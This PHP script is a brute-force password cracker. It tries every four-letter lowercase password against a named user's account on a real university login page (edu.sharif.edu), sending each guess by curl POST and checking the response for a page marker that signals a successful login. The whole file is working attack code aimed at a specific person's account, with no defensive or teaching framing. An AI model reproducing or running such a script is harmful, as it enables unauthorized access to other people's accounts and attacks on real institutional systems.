<?php
/////initial values
$uname='ghayoor';
ob_start();
for ($p1='a';$p1<='z';$p1++){
for ($p2='a';$p2<='z';$p2++){
for ($p3='a';$p3<='z';$p3++){
for ($p4='a';$p4<='z';$p4++){
	$pass=$p1.$p2.$p3.$p4;
	//$pass='1250176824';
	//login/////////////////////////
	$checkpage=curl_grab_page("http://edu.sharif.edu/login.do","username=".$uname."&password=".$pass."&x=115&y=16&command=login",$tt);
	//if ($p4=='a'){
		echo $pass."##";
		ob_flush();
	//}
	$pos = strpos($checkpage,'<html dir="rtl">');
	if($pos === false) {
	}else{
		ob_flush();
		echo "user exists!".$pass."$$$$$$$$$$$$$$$";
		echo $pass;
		break;
	}
}
}
}
}
?>
<?php
function curl_grab_page($url,$data,&$trueurl){
$file=dirname(__FILE__).'cookie.txt';

    $ch = curl_init();
	//curl_setopt($ch, CURLOPT_HEADER,true);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $file);
    curl_setopt($ch, CURLOPT_COOKIEFILE,$file);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
    curl_setopt($ch, CURLOPT_VERBOSE, true);
    curl_setopt($ch, CURLOPT_URL, $url);

    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
    curl_setopt($ch, CURLOPT_POST, TRUE);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
   
	$out= curl_exec ($ch); // execute the curl command
	$trueurl=curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
    curl_close ($ch);
	unset($ch);
	return $out;
}
?>